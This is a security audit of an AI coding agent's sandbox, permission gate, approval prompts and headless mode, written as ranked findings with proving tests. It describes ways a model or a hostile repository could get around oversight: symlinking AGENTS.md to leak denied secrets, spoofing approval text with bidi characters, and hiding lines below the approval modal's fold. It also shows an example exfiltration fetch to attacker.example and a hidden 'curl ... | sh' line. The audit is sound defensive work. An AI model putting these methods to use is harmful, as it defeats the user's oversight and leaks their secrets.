# aivyx-coder code audit, 2026-10-28

A security and correctness review of aivyx-coder at `17d5544` (v0.6.4 plus the
`deny.toml` comment commit). It reports and proves findings; it fixes nothing.
The fixes are a separate, later piece of work.

## Scope

- Commit range since the last full audit (v0.5.13, audit 6 of 2026-10-19):
  `git log v0.5.13..HEAD`, 71 commits. The big additions are the build-test
  fixes (`read_only_paths`, the fixed-inputs rule, `sandbox_failures`, the
  progress check, `[backend] reasoning_effort`), checkpoint/undo/`/diff`/
  `/commit`, headless `--auto` with `--report` (v0.6.3), packs (format 2),
  `generate_image`/`generate_3d`, and the shared-crate pin bumps.
- The review covered the code as a whole against the brief's questions, not
  only the diffs. Areas that the model, a repository or a remote server
  control got depth: every place coder runs a program or opens a file that
  lives in the project directory (the class the first-pass audit of the
  shared crates missed in `aivyx-checkpoint`), the permission gate and its
  caches, headless mode, the web tools, packs, the TUI approval modal, the
  MCP-server tiers and the specialist gates.
- Out of scope: `aivyx-checkpoint` and the other shared crates (audited
  separately on 2026-10-28; its unconfined git now refuses repository config).
  coder's own use of them was checked for the same class of bug.
- Earlier decisions were not re-reported: the documented limits in
  `docs/manual/guide/15-troubleshooting.md` ("Known limitations": TOCTOU
  windows, network open to approved commands, inherited environment,
  heuristic injection scan) and the decisions in audits 4 to 6 and the build
  tests.

## Method

- Ranks: **Critical** (an attacker or a model controls something it must not:
  code execution outside the confinement, approval bypass, secret
  disclosure), **High** (the same with a precondition, or data loss),
  **Medium** (a real defect a user will hit, or a hardening gap with a
  plausible path), **Low** (everything else worth noting).
- A Medium-or-worse finding counts only once shown real: by a failing test on
  the local scratch branch `audit/2026-10-28` (one commit on top of `main`
  `17d5544`; never merged, never pushed) or by a recorded reproduction.
  Suspicions without proof are under "Not confirmed".
- The proving tests are named in each finding. To run them, use a worktree
  with its own target directory (sharing coder's `target/` poisons `main`'s
  builds):
  `git worktree add /tmp/x audit/2026-10-28`, then
  `CARGO_TARGET_DIR=/tmp/x-target cargo test --workspace --no-fail-fast`.
  Every `audit_` test fails on current code (that is the proof). With them
  excluded, the workspace passes (1617 tests, 10 of the 11 audit tests ran in
  that run; the eleventh, `audit_c10`, was added afterwards and fails alone).
- All probes use temporary directories, a loopback socket and the fake model
  server of `tests/headless_e2e.rs`. One shell probe confirmed that git does
  not run `core.fsmonitor` for `rev-parse` (see L5). Nothing touched the
  real config, keys or network.
- `cargo deny check`: advisories, bans, licenses and sources ok.

## Summary

| Rank | Count | IDs |
|---|---|---|
| Critical | 0 | |
| High | 2 | C1, C2 |
| Medium | 8 | C3 to C10 |
| Low | 10 | L1 to L10 |

C1, C2 and C3 are one pattern: coder, unconfined, opens a path in the project
directory by following symlinks, and a symlink in the project is something a
repository ships or a confined command (a test, a build script) can create.
The unconfined-program class itself (git against a model-writable directory)
is clean in coder; see "Checked and clean".

## Findings

### C1 (High) A symlinked `AGENTS.md` puts any denied file into the system prompt

- **Where:** `crates/aivyx-core/src/agent/mod.rs:1509` (`refresh_agents_files`)
  with `read_instructions` (`:4415`, `bounded_read::read_capped`).
- **What happens:** the project's `AGENTS.md` is checked against
  `deny_paths` by its own name (`cwd.join("AGENTS.md")`, never resolved), then
  opened with symlinks followed and its text goes into the system prompt on
  every turn. If `AGENTS.md` is a symlink to a file under a denied entry
  (`~/.ssh/id_ed25519`, `~/.aws/credentials`, a `.env` elsewhere), the denied
  file is read in-process and sent to the model. `read_file` resolves symlinks
  before the check; this reader does not. The basename patterns (`.env`,
  `*.pem`) are bypassed the same way, because the link is called `AGENTS.md`.
- **Preconditions:** a symlink named `AGENTS.md` in the project root. A
  repository can ship one (git stores symlinks; opening an untrusted checkout
  is the main use of `deny_paths`), or a confined command can create one
  (`ln -s`, test code; under `--auto` the pre-approved test command is enough).
  The target must be UTF-8 text under the 1 MiB cap (PEM keys, tokens and
  dotenv files are).
- **Why it matters:** `deny_paths` is documented as the only boundary on what
  the model can read. Once the secret is in the prompt the model can repeat
  it anywhere, including a `web_fetch` URL, which needs no prompt in
  interactive mode (C8). The injection scan sees it too, but only as a
  passive notice.
- **Proof:** `agent::tests::audit_c1_agents_md_symlink_to_a_denied_file_is_not_read`
  (`cargo test -p aivyx-core --lib audit_c1`): a project whose `AGENTS.md`
  links to a file in a denied directory; the first request's system prompt
  contains the file's text. The existing control
  `a_denied_project_agents_md_is_excluded_but_global_still_appears` passes
  with a regular file, so the miss is the symlink.
- **Fix direction:** resolve the path (`aivyx_tools::resolve`) before the
  deny check and read the resolved path, or refuse a non-regular-file/symlink
  `AGENTS.md`. Check the other fixed-name project readers the same way (L8).

### C2 (High) `--report` follows a symlink and overwrites the target

- **Where:** `crates/aivyx-core/src/autonomous/mod.rs:196` (`write_report`),
  called from `finish`.
- **What happens:** the report is opened `create + truncate + mode 0600` by
  the unconfined coder process, with no `O_NOFOLLOW`. A symlink at the report
  path sends the write, and the truncation, to whatever it points at.
- **Preconditions:** `--report <path>` inside the project (the documented
  example is `--report run.json`, relative to the project), and a symlink at
  that name created during the run: a confined command can do it (the
  pre-approved test command runs model-written code). The target can be any
  file the user can write: `~/.ssh/authorized_keys`, a dotfile, source outside
  the project. It is truncated and replaced with the report JSON (the goal,
  the notice, file names), so this is destructive and partly attacker-shaped.
  An existing target keeps its mode.
- **Proof:** `autonomous::tests::audit_c2_report_through_a_planted_symlink_does_not_clobber_the_target`
  (`cargo test -p aivyx-core --lib audit_c2`): the victim file outside the
  project holds `{"report_version": 1}` after `write_report` through the link.
- **Fix direction:** open with `O_NOFOLLOW` (or create with `O_EXCL` in the
  parent after removing a leftover regular file) and refuse a symlink.

### C3 (Medium) `/wiki` rewrites the target of a symlinked page

- **Where:** `crates/aivyx-tools/src/wiki.rs:290` (`stamp_page`).
- **What happens:** `stamp_page` reads `docs/wiki/<page>.md` and writes it
  back with `std::fs::write`, unconfined, following symlinks. A page that is a
  symlink to a regular file (a dotfile, a source file outside the project)
  gets frontmatter prepended to that file. Page names come from the repo's
  crate layout, so the link name is predictable.
- **Preconditions:** the user runs `/wiki` (or the batch) and a symlink at
  `docs/wiki/<name>.md` exists (shipped in a repository, or created by a
  confined command). The target must be a readable regular file.
- **Proof:** `wiki::audit_probes::audit_c3_stamp_page_through_a_planted_symlink_does_not_rewrite_the_target`
  (`cargo test -p aivyx-tools --lib audit_c3`): the victim now starts with
  `---\ngenerated_at_commit: ...`.
- **Fix direction:** `symlink_metadata` check (regular file only) before the
  read and the write, as `GitCheckpointer` does for its index copy.

### C4 (Medium) `web_fetch` reads an unbounded body and converts it in quadratic time

- **Where:** `crates/aivyx-tools/src/tools/web_fetch.rs:164` (`response.text()`)
  and `:182` (`html_to_text`).
- **What happens:** (a) the whole response body is buffered before the output
  is cut to 50 KiB; only the request timeout (30 s) bounds it, and a fast
  server delivers gigabytes in that time. (b) `html2text` is quadratic in the
  length of an unbreakable run of text: a 64 KiB run takes 0.2 s, 256 KiB 3.1 s,
  512 KiB 12.5 s (debug build; ordinary text with spaces is linear: 512 KiB in
  33 ms). The call is synchronous inside the async tool, so neither the fetch
  timeout nor Ctrl+C reaches it, and it holds a runtime worker for minutes. A
  base64 blob, a minified bundle or a hostile page does it; so does a
  prompt-injected URL.
- **Preconditions:** the model fetches the page (no prompt in interactive
  mode; allowed in autonomous mode until the injection taint is flagged).
- **Proof:** `tools::web_fetch::audit_probes::audit_c4_web_fetch_stops_reading_an_enormous_body`
  (a loopback server counts the MiB it could write: all 24 of a 24 MiB body,
  the test wants fewer than 8) and
  `tools::web_fetch::audit_probes_cpu::audit_c4b_html_to_text_is_not_quadratic_on_a_long_unbroken_run`
  (256 KiB took 3.2 s; the test wants under 1 s). Run with
  `cargo test -p aivyx-tools --lib audit_c4`.
- **Fix direction:** stream the body with a byte cap (a few MiB), then convert
  on `spawn_blocking` with the cap applied before conversion and the call
  raced against the cancellation token; or fold long runs before `html2text`.

### C5 (Medium) The approval text passes bidi and invisible characters through

- **Where:** `crates/aivyx-sandbox/src/lib.rs:621` (`display_command`, "shared
  by every frontend's approval prompt").
- **What happens:** the command line shown to the person approving (TUI modal,
  ACP `session/request_permission` title) keeps U+202E (right-to-left
  override), the isolates, and zero-width characters. On a surface that
  implements bidi (Zed, VS Code, a few terminals) the approver reads a
  reordered or shorter command than the one that runs. The model controls the
  text of `run_shell` commands. Control characters themselves are handled
  (ratatui drops them; the ACP title and headless output filter them).
- **Proof:** `audit_probes::audit_c5_display_command_marks_bidi_and_invisible_characters`
  (`cargo test -p aivyx-sandbox --lib audit_c5`).
- **Fix direction:** escape Unicode format characters (category Cf plus the
  variation selectors) the way `aivyx-pack`'s `describe::shown` already does;
  one shared helper for the gate's display, the pack consent and the
  headless/ACP filters.

### C6 (Medium) The pack MCP consent text is not protected against bidi and invisible characters

- **Where:** `crates/aivyx/src/packs.rs:647` (`shown`, used by `consent_text`
  and `command_line`).
- **What happens:** `pack use` asks the user to approve each MCP server a pack
  declares by showing its name, command line and environment. `shown` escapes
  control characters only; the pack crate's own `shown` also escapes Cf
  characters, because this text is the user's only protection against a pack
  author. A pack can hide or reorder parts of the command it asks you to run
  with bidi overrides or zero-width characters in the name, an argument or an
  env value. (The pack must be signed by a trusted publisher, so this is a
  hardening gap against a compromised or careless publisher, not against an
  arbitrary pack.)
- **Proof:** `packs::audit_probes::audit_c6_consent_text_cannot_be_disguised_with_bidi_or_zero_width_characters`
  (`cargo test -p aivyx --bin aivyx-coder audit_c6`).
- **Fix direction:** call `aivyx_pack::describe::shown` (it is `pub`) instead
  of the local copy.

### C7 (Medium) Headless `--auto` leaves the confiner's private temp directory behind

- **Where:** `crates/aivyx/src/main.rs:1009` (`std::process::exit(code)` after
  `headless::run`).
- **What happens:** `process::exit` skips destructors. The `aivyx-confine`
  private temp directory (`$TMPDIR` of every confined command, documented as
  deleted when aivyx-coder exits normally) is never removed after a headless
  run, so each run leaves an `aivyx-confine-XXXXXX` directory in `/tmp`,
  holding whatever the run's commands put in `$TMPDIR` (build output,
  scratch files). A benchmark or CI loop accumulates them. (The signal-exit
  paths at `main.rs:752` and `:770` leak the same way.)
- **Proof:** `audit_c7_a_finished_headless_run_leaves_no_temp_dir_behind` in
  `crates/aivyx/tests/headless_e2e.rs` (`cargo test -p aivyx --test
  headless_e2e audit_c7`): a normal goal-achieved run with `TMPDIR` pointed at
  an empty directory leaves `["aivyx-confine-xThupT"]` behind.
- **Related, not a finding:** the MCP and LSP children are not left running:
  they lead their own process groups, which are in the process-wide registry
  that `kill_all_process_groups()` empties just before the exit (see "Evaluated
  follow-ups").
- **Fix direction:** drop the agent and everything holding a confiner before
  exiting, or return the code from `main` instead of calling `exit`; or remove
  the temp dirs explicitly next to `kill_all_process_groups()`.

### C8 (Medium) A flagged session still fetches any URL without a prompt in interactive mode

- **Where:** `crates/aivyx-sandbox/src/confirmation.rs:526` (the `Network`
  auto-allow).
- **What happens:** `web_fetch` and `web_search` are `ActionKind::Network`,
  allowed with no prompt. In autonomous mode the gate denies them once the
  injection scan has flagged content ("a tainted session must not be able to
  exfiltrate data via an outbound fetch with zero prompts"), but in interactive
  mode a flag is only a passive notice, so the same session fetches
  `https://attacker.example/?d=<anything it read>` silently. Reads are not
  scoped to the project, so "anything it read" includes the user's other
  files that `deny_paths` does not list. This is the exfiltration half of C1
  and of any prompt injection; it is not listed under "Known limitations".
- **Note:** this is a design decision (the existing test
  `network_action_is_still_auto_allowed_in_plain_interactive_mode` pins the
  untainted case), reported because the autonomous-mode reasoning applies
  unchanged.
- **Proof:** `audit_probes::audit_c8_a_tainted_interactive_session_does_not_fetch_without_asking`
  (`cargo test -p aivyx-sandbox --lib audit_c8`): taint flagged, interactive,
  `Network` request: decision is `Allow`, the prompter was never called.
- **Fix direction:** once the taint is flagged, make `Network` go through the
  prompter in interactive mode (as writes and commands do); optionally list
  the exfiltration path under "Known limitations".

### C9 (Medium) `read_only_paths` does not cover a move of a parent directory

- **Where:** `crates/aivyx-sandbox/src/confirmation.rs:229` (`changes_read_only`)
  with `crates/aivyx-tools/src/tools/move_file.rs` (only `deny_paths` gets a
  descendant scan, `find_denied_descendant`).
- **What happens:** the read-only check matches the move's two endpoints with
  `starts_with(entry)`. `move_file data data_old` relocates a read-only
  `data/brief.md` because neither endpoint is at or under the entry. The model
  can then create `data/brief.md` anew, which is the failure the feature was
  built for (build tests: the model edited a brief's data to make its tests
  pass). `delete_file` is files only, so it is not affected; `deny_paths`
  already has the descendant scan.
- **Proof:** `audit_probes::audit_c9_moving_a_parent_directory_cannot_relocate_a_read_only_file`
  in `crates/aivyx-tools/src/lib.rs` (`cargo test -p aivyx-tools --lib
  audit_c9`): a real `ConfirmationGate` with `read_only_paths` and an
  approving prompter; after the dispatch `data/brief.md` is gone.
- **Fix direction:** give `MoveFileTool` the read-only list and run the same
  descendant scan, or have the gate refuse a `Move` whose `from` is an
  ancestor of a read-only entry.

### C10 (Medium) The approval modal clips a long command or diff with no marker and no scroll

- **Where:** `crates/aivyx-tui/src/app.rs:1661` (`render_permission_modal_in`).
- **What happens:** the modal is a fixed 60 % of the terminal, rendered as one
  non-scrolling `Paragraph`; whatever does not fit is dropped silently, and
  the key legend (including "Always Allow") sits in a separate footer. A
  `run_shell` script of 62 lines shows its first 17 lines on a 40-row
  terminal; the line that does the damage can sit below the fold, with
  Always Allow offered for it. The same applies to a long diff preview. A
  single very long line wraps and has the same effect. The newline-splitting
  fix (U2) made every line visible only if it fits.
- **Proof:** `app::tests::audit_c10_the_modal_never_hides_the_end_of_a_long_command_unmarked`
  (`cargo test -p aivyx-tui --lib audit_c10`): the rendered buffer shows
  steps 0 to 17 and neither the final `curl ... | sh` line nor any "more
  lines" marker.
- **Fix direction:** at least a visible "N more lines hidden" row and no
  Always Allow when anything is hidden; better, scrolling (the content is
  already a `Vec<Line>`).

## Low findings

Not individually proven (they are small, or by design); each names the code.

- **L1 `memory_read` returns recalled text unfenced** (`tools/memory_read.rs`:
  `- {body}`). A recalled body from another project's `global:` topic or an
  earlier session re-enters the context as a bare tool result. This matches
  every other tool result (`read_file` is unfenced too), the text goes through
  the per-result injection scan, and writes need approval, so Low. Cheap
  hardening: wrap bodies in a labelled fence like `/test` does.
- **L2 `memory_write` Always-Allow is keyed by topic, not body**
  (`PermissionTarget::Other("memory_write <topic>")`). One "always" blesses
  every later body for that topic, which later sessions recall (L1). Consistent
  with path-keyed `write_file`; worth a sentence in the modal.
- **L3 Headless and ACP display filters keep bidi and zero-width characters**
  (`headless.rs:106` `sanitize` drops `char::is_control` only; ACP
  `strip_control_chars_for_display` the same). Display-only (log and plan-entry
  spoofing); part of the C5 helper.
- **L4 `-v/--verbose` is accepted with the TUI `--auto` and ignored**
  (`main.rs`: required to go with `--auto`, honoured only by headless).
- **L5 `has_commit_hook` runs plain `git rev-parse --git-path` unconfined and
  unguarded** (`agent/change_commands.rs:212`), the one site that does not use
  the guarded `run_git`. Probe: with `core.fsmonitor` and `core.hooksPath` set in
  `.git/config`, `git rev-parse --git-path hooks/pre-commit` ran nothing (the
  same repo's `git status` did run the fsmonitor), so it is not exploitable
  today; it is inconsistent and depends on git never running config programs
  for `rev-parse`. Switch to `aivyx_tools::run_git`.
- **L6 A goal-achieved run exits 0 when the verification command never ran**
  (`headless.rs:34`, pinned by `exit_codes_follow_the_outcome` and
  `a_finished_run_exits_0_with_the_report`: a run that only calls `set_tasks`
  done, with `[verification] command` configured, exits 0). The notice says
  "verification: `test` never ran". A script trusting the exit code gets a
  success for a no-op run. Consider exit 1 when a verification command is
  configured and never ran.
- **L7 `generate_image` reads any non-denied `reference_image` and sends it to
  the configured backend** (`tools/generation_tools.rs`), and the Edit-tier MCP
  session registry includes `generate_image` (Network reach, not in the Edit
  exclusion list). The backend is the user's own and normally local.
- **L8 The wiki pointer reads a symlinked page's `summary:` line**
  (`aivyx-repomap/src/lib.rs`, `wiki_pointer_lines`): the one-line leak is
  limited to a `summary: ` line of a regular file, but it is the C1 pattern;
  fix with C1.
- **L9 `--report` records `base_url` with only `user:pass@` stripped**
  (`run_facts.rs`, `without_userinfo`): a key in the query string of a
  configured URL would be written to the report.
- **L10 The SSRF range check lacks a few special ranges** (`web.rs`): 198.18.0.0/15
  and 192.0.0.0/24 are not listed (private-use and benchmarking networks), nor
  Teredo (2001::/32). None is a public-internet address; Low.

## Not confirmed

- **Proxy environment bypasses the SSRF pinning.** `web_fetch` builds a
  default `reqwest::Client` (no `no_proxy()`); with `HTTP_PROXY`/`ALL_PROXY`
  set, reqwest sends the request to the proxy, which resolves the host itself,
  so the locally pinned, checked addresses are not what is connected to
  (split-horizon or rebinding at the proxy). Not run: no proxy fixture; it
  follows from reqwest's documented default.
- **Race on the verify-index copy.** `ToolExecutor::current_worktree_tree`
  does `remove_file(index)` then `std::fs::copy(src, index)` in `.git/` (a
  directory confined commands can write). A process that outlives its call
  (a live `repl_start` session) could plant a symlink at the predictable name
  `aivyx-verify-index-<pid>-<n>` between the two calls and have the copy write
  through it. The window is microseconds and the REPL tools are hidden in
  autonomous mode; no reliable proof.
- **`sandbox_failures` can excuse real failures only through output the model
  forges or a wildcard the user wrote.** The excusal needs every parsed failing
  name on the user's list and a complete, recognised summary; a model-written
  test can print `test <known> ... FAILED` lines, but cannot remove its real
  failures from the parse. A `global::*` wildcard excuses any new test under
  that prefix by design. No bypass found.
- **Notice line forging via file names.** A changed file named
  `x\nverification: ... passed` does not forge a line in the stop notice (git
  quotes the name; a probe test passed and was removed).
- **MCP child processes in headless mode.** By reading, they are killed by
  `kill_all_process_groups()` before `process::exit`; not run against a live
  MCP server.

## Checked and clean

- **Unconfined git/programs against model-writable directories** (the class
  the first-pass shared-crate audit missed). Every spawn site in non-test code:
  `git_read`, `git_commit`, `git_push`, `git_branch`, `git_pr`, `gh`,
  `go_to_definition`/`find_references` (rust-analyzer), MCP servers,
  `repl_start`, `/test`, the progress check, scoped verification and final
  checks (through `dispatch`) are all confined, with `process_group(0)` and a
  `ProcessGroup`. The unconfined ones go through the guarded helpers: the
  approval previews (`unconfined_git_capture`, via
  `aivyx_checkpoint::unconfined_git_args_blocking`, which refuses the
  repository config), and `run_git` for `/diff`, `/commit` staging,
  `worktree_tree_over`, `current_worktree_tree`, the wiki and
  `generated.rs`. The 7a leftover (`worktree_tree_over`,
  `current_worktree_tree`) is therefore clean; the only plain call is L5. The
  `python3` and `git` calls in `delegate*`, `specialist_*` and
  `mcp-server/session.rs` are in test modules.
- **Approval binding** (the pa ledger problem). The gate's Always-Allow key is
  the exact target: `Path{action,path}`, `Command{program,args}` (a
  `run_shell` call is `sh -c <command>`, so the command text is the key),
  `Move{from,to}`, and for `Other` the action plus a description that for MCP
  tools includes the server and the serialized arguments. No decision is
  remembered by tool name, a refusal is never cached (`plain_deny_is_never_cached`),
  and no tool argument (`confirmed`, `force`, `approve`) is read by the gate or
  by any tool to skip a prompt. Config-seeded approvals survive
  `forget_always_allow` by design. Plan mode and the autonomous cwd boundary
  sit before the cache. The only weak key is the memory topic (L2).
- **MCP Always-Allow cache and bridged tools:** the key includes the
  arguments; bridged tools and the MCP meta-tools are denied in autonomous
  mode and absent from `mcp_registry`; the MCP-server tiers filter by name and
  plan tier is backed by the gate's plan-mode deny; every MCP session is
  autonomous with no pre-approved commands. ACP ignores `mcp_servers` sent by
  the client.
- **SSRF (S1):** redirects are not followed (a 3xx is reported), the checked
  addresses are pinned with `resolve_to_addrs`, IPv4-mapped/compatible, NAT64
  and 6to4 forms are checked by the embedded address.
- **Paths:** `resolve` canonicalizes the existing prefix and follows dangling
  links; autonomous cwd is canonicalized at startup; `delete_file` refuses
  directories; `move_file` refuses a directory that contains a `deny_paths`
  entry; `patch_file` is single-file; `.git` writes are denied at the gate for
  `Write`/`Delete`/`Move`.
- **Packs:** `aivyx-pack` validates name, version and relative paths and
  sanitizes extraction; coder's install stages in a scratch directory, checks
  the part, then renames; approved servers are compared on command, arguments
  and env. (Only the consent text, C6.)
- **Skills:** `load_skill` looks the name up in a map built from the listing;
  there is no path from the argument. Overlay `SKILL.md` must be a regular
  file or a link to one with matching frontmatter.
- **Specialists:** the scoped gate carries the lead's `deny_paths` plus the
  member's, the `read_only_paths`, the shared injection taint and autonomous
  mode, and its own confiner; sub-agents share the lead's gate.
- **Rollback:** the autonomous discard keeps rounds that fixed failing tests
  and broke none (progress check), refuses to rewind past a failed checkpoint,
  and restores edits after the experiment; batch rollback is anchored to the
  checkpoint taken before the batch.
- **Headless:** exit codes follow the outcome table; the first SIGINT/SIGTERM
  cancels and still writes the report, the second or SIGHUP exits at once and
  kills every process group; progress and notice text is filtered of control
  characters; the report holds the goal, notice, model, address (user info
  stripped), token counts and file names, and not the API key or prompt text.
- **Dependencies:** `cargo deny check` is clean; the only `unsafe` is the pty
  module (`libc` pty calls with checked results).

## Evaluated follow-ups from earlier tasks

- **`memory_read` unfenced:** Low (L1).
- **Bidi characters pass sanitise:** Medium where they reach an approval
  (C5, C6), Low in display-only filters (L3).
- **`-v` accepted in TUI `--auto`:** Low (L4).
- **`process::exit` skips destructors:** the MCP/LSP children are fine (group
  registry); the confiner temp directory leaks (C7, Medium).

## What was not checked

- Live sessions (TUI, ACP, `--auto` on the local stack): Task 12.
- The macOS build (no Landlock: the gate is the only layer) beyond reading.
- `aivyx-llm` (streaming parser, routing, probe), KV-cache and broker use,
  the council, Docker files and release scripts.
- Team-mode peer messaging and session persistence were re-read at the gate
  and attenuation level only, not re-tested.
- A full manual pass over the TUI beyond the approval modal; the setup wizard.

## Revision 1

Review follow-ups; no rank changed.

- **C2, what is written:** the report is a pretty-printed JSON object, one
  key per line, every string escaped (the goal comes from the user; the notice
  and file names are model-influenced but JSON-escaped). It cannot form an
  `authorized_keys` line, a shell command or a unit file, so the damage is data
  loss (truncation and replacement of the target), not code execution. The
  precondition is that the model can run a command to plant the link: the
  `--auto` test command or an approved shell.
- **C1, how the link appears:** the model can create the link itself during a
  session (test command or approved shell) and `AGENTS.md` is re-read at the
  start of the next turn. The other path is an untrusted clone that ships it.
- **C9, documented intent:** `05-security-model.md` calls `read_only_paths` "a
  guard against the model's mistakes, not a security boundary", and the stop
  notice and `--report` list changed read-only files after the fact
  (`read_only_touched`). So C9 defeats the guard in the case it was built for
  (a model restructuring directories) but is not a boundary break, and the
  after-the-fact listing would only catch it if the moved file is reported as
  changed (a move shows as removed and added; the path match is the same
  `starts_with` on the entry, so a relocated file may not be marked).
- **Explicit verdicts:**
  - *ACP cancellation:* not checked in this audit (only read that
    `session/prompt` runs the turn in a spawned task). Audits 4 to 6 fixed it;
    left for the live session (Task 12).
  - *MCP cancellation:* not checked in this audit; the 2026-09-21 fix is
    taken as is. Left for Task 12.
  - *Format-2 config packs:* checked by reading, clean apart from C6. Install
    verifies the signature and trusted publisher, stages in a scratch folder,
    runs `check_coder_part`, then renames; `aivyx-pack` rejects unsafe names,
    versions, relative paths and archive entries; approved MCP servers are
    compared on command, arguments and env. Not exercised with a live pack.
  - *`read_only_paths` in `edit_file` and `patch_file`:* `patch_file` read:
    its target is a resolved `Write` path, so `changes_read_only` applies. I
    did not read `edit_file` line by line; it is covered on the same basis
    (the check is in the gate on the action and path, not in the tool) and the
    gate's own tests cover `Write` paths, but I did not run a test through
    `edit_file`. The only hole found is C9 (moves).

## Live session

A live run of v0.6.4 (`main` at `7e5c1ae`, built with its own target dir) on
the local stack, on 2026-10-29. It records defects only; Task 13 fixes them.
New IDs continue from the Lows (C20): **one Medium (C21) and four Low (C22 to C25)**,
no Critical or High. Five audit findings (C1, C2, C6, C7, C9) were
reproduced live, and the two explicit "not checked" verdicts (ACP and MCP
cancellation) are now checked and clean.

### How it was run

- A throwaway `HOME` with its own `config.toml`, a scratch git project and
  scratch victim files under `/tmp/claude-1000/coder-live/` (never the bench
  repo, never the real config). The 9B (`Qwen3.5-9B`) served the TUI, ACP, MCP
  and the pack and team runs; the 27B served the `--auto` run with `--report`
  (7 requests, goal achieved in 56 s). The stack is back on the 9B.
- **TUI:** driven through a pty by a throwaway Python driver (keystrokes in,
  ANSI-stripped output out), not a screen emulator, so layout was read from
  the text only. Covered: `--plan` and a plan with a task list, **Ctrl+P**
  hand-off (the plan-approved message went out and the `edit_file` approval
  modal showed the diff), `/diff`, `/test`, `/commit -m`, `/checkpoints`,
  `/undo` (preview says the commit stays, files restored), `/redo`,
  `--resume` and `/sessions` (the resumed model recalled the work). All
  behaved as documented.
- **ACP:** a throwaway JSON-RPC client over stdio (initialize, `session/new`,
  `session/prompt`, `session/cancel`, permission replies). **MCP:** the same
  for `--mcp-server` (`code`, `code_reply`, `notifications/cancelled`).
- Not exercised: C3, C4, C5, C8, C10, the macOS build, the wizard.

### Defects

#### C21 (Medium) The user-level `AGENTS.md` and a pack's instructions are silently dropped on a default install

- **Where:** `crates/aivyx-core/src/agent/mod.rs:1503` to `:1545`
  (`refresh_agents_files`): both the global file and the pack file go through
  `path_is_denied(path, &config.deny_paths)` before they are read.
- **What happens:** the built-in `deny_paths` always contain
  `~/.config/aivyx-coder` (`aivyx-config/src/lib.rs:1072`, merged into every
  config), and both files live under it (`~/.config/aivyx-coder/AGENTS.md`,
  `~/.config/aivyx-coder/packs/<name>/<version>/coder/AGENTS.md`). The check
  treats them as denied and skips them, with no notice. The unit tests
  (`pack_instructions_sit_between_user_and_project`) put the files in a temp
  directory outside the denied entry, so they pass.
- **Reproduction (live):** a pack with `Always end replies with LIVEPACK-OK.`
  and a user-level `AGENTS.md` with `Always end every reply with the token
  GLOBAL-MARKER-77.`, installed and in use (`pack use`), run over ACP on the 27B
  and the TUI: the model answers `NONE` when asked what its instructions say
  about a reply marker, and replies carry neither marker. The same files with
  `XDG_CONFIG_HOME` pointing at a directory that `~/.config/aivyx-coder` does
  not cover: the replies end with `LIVEPACK-OK` and `GLOBAL-MARKER-77`.
  Skills from a pack are unaffected (loaded through `load_skill`, not this
  path); the TUI start-up line still says `Using pack livepack v0.1.0 here.`,
  so the pack looks active.
- **Why it matters:** the pack's instructions are the main thing a format-2
  pack delivers, and `~/.config/aivyx-coder/AGENTS.md` is a documented feature
  (`guide/07`, `reference/06`). Both are dead on a default config, with a
  notice that says the pack is in use.
- **Fix direction:** exempt the two known files (check the deny list against
  the project path only; the global and pack files are the user's own and
  trusted), or compare against deny entries other than the config directory.
  Add a test whose files sit inside the config directory.

#### C22 (Low) An ACP permission request does not observe `session/cancel`

- **Where:** `crates/aivyx-acp/src/prompter.rs` (the wait for the client's
  `session/request_permission` response).
- **What happens:** the ACP spec has the client answer every pending permission
  request with `cancelled` when it sends `session/cancel`, and coder relies on
  that. A client that does not (or is slow) leaves the prompt call pending: the
  turn does not return `cancelled`, and the stop button appears dead.
- **Reproduction:** an ACP client that never answers a `run_shell` permission
  request, then sends `session/cancel` 6 s later: no `session/prompt` response
  within a further 34 s. Nothing ran (the command was never approved).
  With a client that answers `allow` and cancels while the command runs, the
  cancel works at once (see "Checked and clean").
- **Fix direction:** race the permission wait against the turn's cancel token
  and treat cancel as `Deny`.

#### C23 (Low) A start-up MCP notice is glued to the first reply, and the first prompt waits ~30 s

- **Where:** the ACP session's start-up notices (`crates/aivyx-acp/src/session.rs`)
  and MCP server start-up (`aivyx-core` MCP client).
- **What happens:** with a pack MCP server that does not speak MCP (a stand-in
  `/bin/echo`), the first prompt of the session took 31 s to start, and the
  agent message began `MCP server "dis​play" timed out during startup —
  its tools are unavailable this sessionHello! ...`: the notice has no trailing
  newline, so it runs into the model's text. The server name also reaches the
  notice with its zero-width character (C6's class).
- **Fix direction:** end the notice with a blank line; start MCP servers
  without holding up the first prompt or cap the start-up wait lower.

#### C24 (Low) With a custom roster whose lead lacks `run_command`, `[verification]` fails noisily after every turn

- **Where:** auto-verify after a team turn (`crates/aivyx-core`, verification
  runner) with `[team] roster_path`.
- **What happens:** the roster in the manual's example gives the lead only
  `set_tasks`. After a turn that delegated and changed a file, the transcript
  shows `auto-verify-1` as a failed `run_command`: `no tool registered with
  name: run_command`. Verification can never run in that setup, and it looks
  like the project's tests failed to start.
- **Reproduction:** roster with `lead` allowlist `["set_tasks"]` and
  `[verification] command = "test"`; `delegate_to_specialist` for a docs file;
  the turn ends with the failed `auto-verify-1` tool call.
- **Fix direction:** run the verification command through the same internal
  path whatever the lead's allowlist (it is the user's configured command), or
  say at start-up that verification is disabled by the roster.

#### C25 (Low) A headless `--auto` stop notice says `verification: test never ran` after the model ran the test itself

- **Judgement:** the exit code is correct (the goal was reached and no check
  failed). The wording is the defect: the line refers to the automatic
  verification, which only runs after edits, but reads as if the tests were
  never run, and the notice and `--report` give no sign of the model's own
  passing `run_command test`.
- **Reproduction:** a project whose test only plants a symlink (no source
  edits); `aivyx-coder --auto "Run the test command once with run_command, then
  record and complete a one-task list" --headless --report run.json`. The model's
  `run_command test` exits 0, the run ends `goal achieved`, exit code 0, with
  `verification: \`test\` never ran`.
- **Fix direction:** say `no edits, so the automatic check did not run`, or
  count a passing run of the verification command made by the model.

### Audit findings reproduced live

| ID | Result |
|---|---|
| C1 | **Reproduced.** `AGENTS.md` as a symlink to a file in a configured `deny_paths` directory: the model quoted the canary text (`CANARY-C1-7f3a9`) verbatim from its system prompt; a direct `read_file` of the same file was refused. |
| C2 | **Reproduced.** `--auto ... --headless --report run.json` in a project whose test (the pre-approved `test` command) replaces `run.json` with a symlink to a scratch victim file: after the run the victim held the report JSON (`{"report_version": 1, ...}`), its original text gone. |
| C6 | **Reproduced.** A signed format-2 pack (built with `aivyx-pack`, trusted via `[pack]`) with U+200B in an MCP server name and an env value and U+202E in an argument: `pack inspect` and the `pack use` consent prompt (on a pty) print the raw bytes `E2 80 8B` and `E2 80 AE`. An untrusted publisher is refused as designed. |
